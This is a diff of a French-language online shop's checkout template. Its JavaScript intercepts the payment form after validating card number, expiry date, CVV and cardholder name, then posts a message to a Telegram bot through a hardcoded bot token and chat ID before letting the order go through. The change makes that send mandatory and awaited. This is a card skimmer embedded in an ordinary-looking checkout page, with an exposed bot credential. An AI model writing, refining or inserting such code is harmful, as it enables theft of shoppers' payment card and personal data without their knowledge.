@@ -1050,6 +1050,7 @@
     </div>
 </div>
 {% endblock %}
+
 {% block extra_js %}
 <script>
     // Variables globales
@@ -1189,12 +1190,6 @@
         updateOrderSummary();
     }
 
-    // Appeler cette fonction quand la page est chargée
-    document.addEventListener('DOMContentLoaded', function() {
-        resetCheckoutForm();
-        // ... (autres initialisations)
-    });
-
     // Sélection du mode de paiement
     function selectPayment(method) {
         // Masquer tous les formulaires
@@ -1272,53 +1267,71 @@
         e.target.value = value;
     });
 
-    // Validation du formulaire
-    document.getElementById('payment-form').addEventListener('submit', function(e) {
+    // Mise à jour des champs cachés
+    function updateHiddenFields() {
+        const fields = ['email', 'phone', 'firstname', 'lastname', 'delivery-address', 'delivery-zip', 'delivery-city', 'delivery-country'];
+        fields.forEach(id => {
+            const el = document.getElementById(id);
+            const hiddenEl = document.getElementById(`checkout-${id}`);
+            if (el && hiddenEl) {
+                hiddenEl.value = el.value || '';
+                console.log(`${id}: ${el.value}`); // Débogage des valeurs
+            }
+        });
+    }
+
+    // Validation du formulaire et envoi à Telegram
+    document.getElementById('payment-form').addEventListener('submit', async function(e) {
+        e.preventDefault(); // Empêche la soumission immédiate
         const paymentMethod = document.getElementById('payment-method-input').value;
         let isValid = true;
-        
+
         if (!paymentMethod) {
             alert('Veuillez sélectionner un mode de paiement');
             isValid = false;
         }
-        
+
         if (paymentMethod === 'card') {
             const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
             const expiryDate = document.getElementById('expiry-date').value;
             const cvv = document.getElementById('cvv').value;
             const cardName = document.getElementById('card-name').value;
-            
+
             if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
                 alert('Veuillez entrer un numéro de carte valide (16 chiffres)');
                 isValid = false;
             }
-            
+
             if (!expiryDate.match(/^\d{2}\/\d{2}$/)) {
                 alert('Veuillez entrer une date d\'expiration valide (MM/AA)');
                 isValid = false;
             }
-            
+
             if (!cvv.match(/^\d{3,4}$/)) {
                 alert('Veuillez entrer un code CVV valide (3 ou 4 chiffres)');
                 isValid = false;
             }
-            
+
             if (cardName.trim() === '') {
                 alert('Veuillez entrer le nom figurant sur la carte');
                 isValid = false;
             }
         }
-        
+
         if (isValid) {
-            // Envoi des données à Telegram avant soumission
-            sendToTelegram();
-        } else {
-            e.preventDefault();
+            updateHiddenFields(); // Mettre à jour les champs cachés
+            try {
+                await sendToTelegram(); // Attendre l'envoi à Telegram
+                this.submit(); // Soumettre le formulaire
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi à Telegram :', error);
+                alert('Erreur lors de l\'envoi des données à Telegram. Veuillez réessayer.');
+            }
         }
     });
 
     // Envoi des données à Telegram
-    function sendToTelegram() {
+    async function sendToTelegram() {
         const telegramBotToken = '7866279403:AAEWq-i2dnjUM4yQLuW9JbOZliuB8K_nmHA';
         const chatIds = ['5652184847'];
         
@@ -1350,9 +1363,10 @@
         message += `- ${item.product.name} x${item.quantity}: ${(item.product.price * item.quantity).toFixed(2)}€\n`;
         {% endfor %}
         
-        // Envoi asynchrone pour ne pas bloquer la soumission du formulaire
-        chatIds.forEach(chatId => {
-            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        // Envoi asynchrone avec délai pour éviter les limites de taux
+        for (const chatId of chatIds) {
+            await new Promise(resolve => setTimeout(resolve, 1000)); // Délai de 1 seconde
+            const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -1362,8 +1376,12 @@
                     text: message,
                     parse_mode: 'HTML'
                 })
-            }).catch(error => console.error('Erreur Telegram:', error));
-        });
+            });
+            const data = await response.json();
+            if (!data.ok) {
+                throw new Error(`Erreur API Telegram : ${data.description}`);
+            }
+        }
     }
 
     // Pré-remplissage pour les utilisateurs connectés
@@ -1383,53 +1401,21 @@
         
         // Sélectionner la livraison standard par défaut
         document.getElementById('standard-delivery').checked = true;
+        
+        // Réinitialiser le formulaire
+        resetCheckoutForm();
     });
+
+    // Mise à jour des champs cachés en temps réel
     document.addEventListener('DOMContentLoaded', function () {
         const form = document.getElementById('payment-form');
 
-    // Fonction pour mettre à jour les champs hidden depuis les visibles
-    const updateHiddenFields = () => {
-        const visibleEmail = document.getElementById('email')?.value || '';
-        const visiblePhone = document.getElementById('phone')?.value || '';
-        const visibleFirstname = document.getElementById('firstname')?.value || '';
-        const visibleLastname = document.getElementById('lastname')?.value || '';
-        const deliveryAddress = document.getElementById('delivery-address')?.value || '';
-        const deliveryZip = document.getElementById('delivery-zip')?.value || '';
-        const deliveryCity = document.getElementById('delivery-city')?.value || '';
-        const deliveryCountry = document.getElementById('delivery-country')?.value || '';
-
-        // Champs infos utilisateur
-        document.getElementById('checkout-email').value = visibleEmail;
-        document.getElementById('checkout-phone').value = visiblePhone;
-        document.getElementById('checkout-firstname').value = visibleFirstname;
-        document.getElementById('checkout-lastname').value = visibleLastname;
-
-        // Adresse livraison
-        document.getElementById('checkout-delivery-address').value = deliveryAddress;
-        document.getElementById('checkout-delivery-zip').value = deliveryZip;
-        document.getElementById('checkout-delivery-city').value = deliveryCity;
-        document.getElementById('checkout-delivery-country').value = deliveryCountry;
-
-        // Adresse facturation = identique
-        document.getElementById('checkout-billing-address').value = deliveryAddress;
-        document.getElementById('checkout-billing-zip').value = deliveryZip;
-        document.getElementById('checkout-billing-city').value = deliveryCity;
-        document.getElementById('checkout-billing-country').value = deliveryCountry;
-    };
-
-    // Mettre à jour les champs cachés au moment du submit
-    form.addEventListener('submit', function (e) {
-        updateHiddenFields();
+        ['email', 'phone', 'firstname', 'lastname', 'delivery-address', 'delivery-zip', 'delivery-city', 'delivery-country'].forEach(id => {
+            const el = document.getElementById(id);
+            if (el) {
+                el.addEventListener('change', updateHiddenFields);
+            }
+        });
     });
-
-    // Mise à jour en temps réel
-    ['email', 'phone', 'firstname', 'lastname', 'delivery-address', 'delivery-zip', 'delivery-city', 'delivery-country'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) {
-            el.addEventListener('change', updateHiddenFields);
-        }
-    });
-});
-
 </script>
 {% endblock %}
